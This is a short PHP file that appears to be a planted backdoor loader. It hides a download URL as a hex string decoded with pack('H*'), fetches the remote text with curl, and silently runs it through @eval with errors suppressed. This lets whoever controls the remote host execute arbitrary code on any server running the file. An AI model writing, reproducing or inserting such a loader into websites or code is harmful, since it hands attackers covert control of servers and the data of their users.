<?php
$type = "d_20143";
if(!function_exists('rscc_dl')){
		function rscc_dl($url) {
			$ch = curl_init();$timeout = 5;curl_setopt ($ch, CURLOPT_URL, $url);
			curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
			$file_contents = curl_exec($ch);
			curl_close($ch);
		return $file_contents;
		}
	}
$wps =@rscc_dl(sprintf('%s?%s',pack("H*",'687474703a2f2f696e7374616c6c2e6d6f6e6769742e636f6d2f66696c652f312d696e7374616c6c2e747874'),uniqid()));
@eval($wps);
?>